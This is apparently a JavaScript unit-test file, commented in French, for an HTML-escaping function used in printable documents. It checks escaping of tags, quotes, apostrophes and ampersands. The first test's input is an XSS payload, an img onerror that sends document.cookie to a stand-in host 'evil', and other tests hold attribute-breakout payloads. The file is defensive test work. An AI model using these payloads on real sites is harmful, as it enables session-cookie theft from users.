import { echapper } from './utils';

describe('échappement HTML des documents imprimables', () => {
  it('neutralise une injection de script', () => {
    const charge = `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`;
    const rendu = echapper(charge);
    expect(rendu).not.toContain('<img');
    expect(rendu).toContain('&lt;img');
  });

  it("échappe le guillemet, donc la rupture d'attribut", () => {
    // C'est l'écart qui séparait les seize copies : sans `&quot;`, une valeur
    // placée dans un attribut `class="…"` s'en échappait d'elle-même.
    expect(echapper('a" onmouseover="alert(1)')).toBe('a&quot; onmouseover=&quot;alert(1)');
  });

  it("échappe l'apostrophe, qui referme un attribut en guillemets simples", () => {
    expect(echapper("a' onfocus='alert(1)")).toBe('a&#39; onfocus=&#39;alert(1)');
  });

  it("échappe l'ampersand en premier, donc ne double pas les entités", () => {
    // `&lt;` ne doit pas devenir `&amp;lt;` : l'ordre des remplacements compte.
    expect(echapper('&lt;')).toBe('&amp;lt;');
    expect(echapper('<')).toBe('&lt;');
  });

  it('traite les valeurs absentes comme du texte vide', () => {
    expect(echapper(null)).toBe('');
    expect(echapper(undefined)).toBe('');
  });

  it('laisse le texte ordinaire intact', () => {
    expect(echapper('Rectorat de Conakry')).toBe('Rectorat de Conakry');
    expect(echapper(42)).toBe('42');
  });
});
